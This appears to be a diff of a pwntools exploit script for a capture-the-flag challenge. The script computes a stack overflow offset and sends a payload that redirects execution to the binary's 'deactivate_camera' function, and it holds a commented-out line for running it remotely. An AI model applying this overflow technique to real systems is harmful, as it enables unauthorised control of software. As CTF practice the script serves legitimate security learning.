@@ -46,28 +46,20 @@ context.log_level = 'info'
 # Pass in pattern_size, get back EIP/RIP offset
 offset = find_ip(cyclic(100))
 
-#print(elf.functions)
-
 # Start program
 io = process()
 #io = remote('target_ip', port) <- for running the exploit remotely and getting the flag from the target
 
 rop = ROP(elf)
 
-#pprint(rop.gadgets)
-
 # Build the payload
 payload = flat (
     {offset: elf.functions.deactivate_camera}
 )
 
-# Save the payload to file
-write('payload', payload)
-
 # Send the payload
 io.sendlineafter('>', '1')
 io.sendlineafter('>', payload)
 
-# Got Shell?
 io.interactive()
 
